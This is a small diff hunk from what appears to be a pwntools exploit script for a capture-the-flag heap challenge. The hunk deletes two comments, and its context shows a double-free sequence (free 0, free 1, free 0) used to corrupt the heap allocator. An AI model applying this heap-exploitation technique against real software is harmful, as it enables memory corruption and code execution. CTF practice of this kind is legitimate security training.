@@ -25,8 +25,8 @@ def free(idx):
     opt(2)
     p.sendlineafter("which paper you want to delete,please enter it's index(0-9):",str(idx))
 
-add(0,0x60-8,"aa") # malloc(2) -> 0x20 chunk
-add(1,0x60-8,"aa") # malloc(2) -> 0x20 chunk
+add(0,0x60-8,"aa")
+add(1,0x60-8,"aa")
 free(0)
 free(1)
 free(0)
